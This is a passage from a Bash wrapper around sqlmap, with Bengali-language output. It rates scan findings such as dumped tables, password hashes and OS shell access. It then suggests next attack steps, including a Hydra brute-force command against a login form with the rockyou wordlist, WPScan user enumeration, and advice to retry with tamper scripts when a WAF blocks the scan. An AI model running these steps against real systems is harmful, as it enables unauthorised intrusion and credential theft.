        echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
    fi

    # Tables found
    if grep -qi "Database:.*\nTable:" "$outfile" 2>/dev/null || grep -qi "fetched tables" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 Database Tables বের হয়েছে!${NC}"
        echo -e "     ${WHITE}→ সব table নাম দেখা যাচ্ছে — data structure exposed।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
    fi

    # Users/passwords
    if grep -qi "database management system users\|password hash\|cracked password" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 Database User Credentials পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ DB user এর username এবং password hash বের হয়েছে।${NC}"
        echo -e "     ${WHITE}→ এই credentials দিয়ে সরাসরি DB তে login সম্ভব।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
    fi

    # OS shell
    if grep -qi "os-shell\|command standard output" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}💀 OS Shell Access পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ Server এর operating system এ command চালানো সম্ভব!${NC}"
        echo -e "     ${WHITE}→ এটি সর্বোচ্চ মাত্রার compromise।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL (Maximum)${NC}"; echo ""
    fi

    # WAF detected
    if grep -qi "WAF/IPS\|web application firewall\|heuristics detected" "$outfile" 2>/dev/null; then
        medium=$((medium+1))
        echo -e "  ${CYAN}${BOLD}ℹ WAF/IPS Detected!${NC}"
        echo -e "     ${WHITE}→ Web Application Firewall আছে — scan block হতে পারে।${NC}"
        echo -e "     ${WHITE}→ Tamper script বা delay দিয়ে আবার চেষ্টা করুন।${NC}"
        echo -e "     ${CYAN}→ ঝুঁকি: MEDIUM (protection আছে কিন্তু bypass সম্ভব)${NC}"; echo ""
    fi

    # Not vulnerable
    if grep -qi "does not seem to be injectable\|not vulnerable\|all tested parameters do not appear" "$outfile" 2>/dev/null; then
        info=$((info+1))
        echo -e "  ${GREEN}${BOLD}✅ SQL Injection পাওয়া যায়নি।${NC}"
        echo -e "     ${WHITE}→ Test করা parameters এ injection সম্ভব হয়নি।${NC}"
        echo -e "     ${WHITE}→ অন্য parameter বা technique দিয়ে আবার চেষ্টা করুন।${NC}"
        echo -e "     ${GREEN}→ ঝুঁকি: LOW${NC}"; echo ""
    fi

    # Summary
    echo -e "  ${CYAN}${BOLD}━━━ সামগ্রিক ঝুঁকি মূল্যায়ন ━━━${NC}"
    echo -e "  ${RED}   Critical : $critical টি${NC}"
    echo -e "  ${YELLOW}   High     : $high টি${NC}"
    echo -e "  ${CYAN}   Medium   : $medium টি${NC}"
    echo -e "  ${WHITE}   Info/Low : $info টি${NC}"
    echo ""
    if   [ "$critical" -gt 0 ]; then
        echo -e "  ${RED}${BOLD}  সার্বিক ঝুঁকি : ██████████ CRITICAL — Database সম্পূর্ণ compromised!${NC}"
    elif [ "$high" -gt 0 ]; then
        echo -e "  ${YELLOW}${BOLD}  সার্বিক ঝুঁকি : ███████░░░ HIGH — দ্রুত patch করুন।${NC}"
    elif [ "$medium" -gt 0 ]; then
        echo -e "  ${CYAN}  সার্বিক ঝুঁকি : █████░░░░░ MEDIUM — WAF আছে, কিন্তু সতর্ক থাকুন।${NC}"
    else
        echo -e "  ${GREEN}  সার্বিক ঝুঁকি : ███░░░░░░░ LOW — এই parameter এ injection নেই।${NC}"
    fi
    echo ""
    } | tee "$report_file"
}

# ================================================================
# NEXT TOOL SUGGESTION
# ================================================================
suggest_next_tool() {
    local outfile=$1

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║             পরবর্তী Scan এর সাজেশন                                 ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    if grep -qi "is vulnerable\|sqlmap identified" "$outfile" 2>/dev/null; then
        echo -e "  ${RED}${BOLD}🌐 Burp Suite${NC} — Manual Exploitation"
        echo -e "     ${WHITE}কারণ: Injection পাওয়া গেছে — manually deeper exploit করুন।${NC}"
        echo -e "     ${CYAN}কমান্ড: burpsuite (Repeater/Intruder দিয়ে test করুন)${NC}"; echo ""

        echo -e "  ${YELLOW}${BOLD}🔍 Gobuster${NC} — Directory Scan on Vulnerable Target"
        echo -e "     ${WHITE}কারণ: SQLi আছে — আরো hidden files থাকতে পারে।${NC}"
        echo -e "     ${CYAN}কমান্ড: gobuster dir -u http://target.com -w wordlist.txt${NC}"; echo ""
    fi

    if grep -qi "wordpress\|wp-" "$outfile" 2>/dev/null; then
        echo -e "  ${MAGENTA}${BOLD}🔧 WPScan${NC} — WordPress Deep Scan"
        echo -e "     ${WHITE}কারণ: WordPress detect হয়েছে।${NC}"
        echo -e "     ${CYAN}কমান্ড: wpscan --url http://target.com --enumerate u,p,t${NC}"; echo ""
    fi

    echo -e "  ${GREEN}${BOLD}🔑 Hydra${NC} — Login Brute Force"
    echo -e "     ${WHITE}কারণ: DB credentials পেলে login page তেও test করুন।${NC}"
    echo -e "     ${CYAN}কমান্ড: hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \"/login:u=^USER^&p=^PASS^:F=incorrect\"${NC}"; echo ""

    echo -e "  ${WHITE}${BOLD}🌐 Nikto${NC} — Full Web Vulnerability Scan"
    echo -e "     ${WHITE}কারণ: SQLi এর পাশাপাশি অন্য vulnerability ও থাকতে পারে।${NC}"
    echo -e "     ${CYAN}কমান্ড: nikto -h http://target.com${NC}"; echo ""
}

# ================================================================
# SAVE RESULTS
# ================================================================
save_results() {
    local scan_out=$1
    local bangla_out=$2
    local out_dir=$3

    echo ""
    echo -e "${GREEN}[✓] SQLmap output automatically save হয়েছে: $out_dir${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"[?] বাংলা analysis সহ full report আলাদা file এ save করবেন? (y/n): "${NC})" sc
    if [[ "$sc" =~ ^[Yy]$ ]]; then
        local fname="$out_dir/full_report_bangla.txt"
        {
            echo "============================================================"
            echo "  SQLMAP SCAN RESULTS  —  SAIMUM's Automation Tool"
            echo "  Target : $TARGET"
            echo "  Date   : $(date)"
            echo "============================================================"
            echo ""
            echo "=== SQLMAP RAW OUTPUT ==="
            cat "$scan_out"
            echo ""
            echo "=== BANGLA ANALYSIS ==="
            sed 's/\x1b\[[0-9;]*m//g' "$bangla_out"
        } > "$fname"
        echo -e "${GREEN}[✓] Full report saved → $fname${NC}"
        echo "$(date) | $TARGET | $fname" >> "$HISTORY_FILE"
    fi
}

# ================================================================
# MAIN LOOP
# ================================================================
main() {
    show_banner
    check_deps

    while true; do

        # Step 1 — Target
        get_target

        # Pre-scan recon
        local recon_target="$TARGET"
        [[ "$TARGET" == "multiple_urls" ]] && recon_target="Multiple URLs"
        if [[ "$TARGET" != "multiple_urls" ]]; then
            pre_scan_recon "$TARGET"
        fi

        # Step 2 — Injection point
        get_injection_point

        # Step 3 — Attack config
        get_attack_config

        # Step 4 — What to extract
        get_extraction_goal

        # Step 5 — Extra options
        get_extra_options

        # Step 6 — Build & Run
        build_and_run

        echo ""
        read -p "$(echo -e ${YELLOW}"[?] আরেকটি scan করবেন? (y/n): "${NC})" again
        [[ ! "$again" =~ ^[Yy]$ ]] && {
            echo ""
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            echo ""
            exit 0
        }
        show_banner
    done
}

main
